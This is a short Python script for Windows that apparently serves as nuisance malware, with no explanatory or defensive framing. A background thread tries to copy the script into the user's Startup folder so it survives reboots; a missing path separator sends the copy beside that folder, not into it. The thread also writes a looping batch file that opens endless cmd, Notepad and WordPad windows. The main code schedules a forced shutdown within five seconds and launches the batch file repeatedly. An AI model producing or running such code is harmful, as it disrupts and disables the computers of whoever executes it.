from threading import Thread
import os
from time import sleep
from shutil import copy
from sys import argv
def CheckAutoLoad():
    while True:
        main=f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
        try:
            if(os.path.exists(main+os.path.basename(argv[0]))==True):
                pass
            else:
                copy(argv[0],main+os.path.basename(argv[0]))
        except:
            pass
        try:
            if(os.path.exists(f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/MainWindow.bat')==True):
                pass
            else:
                sdf=open(f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/MainWindow.bat','w',encoding='utf-8')
                sdf.write('@echo off\n:a\nstart cmd\nstart notepad\nwordpad\ngoto a')
                sdf.close()
        except:
            pass
        sleep(5)
Thread(target=CheckAutoLoad).start()
os.system('shutdown -s -t 5')
while True:
    try:
        os.startfile(f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/MainWindow.bat')
    except:
        pass
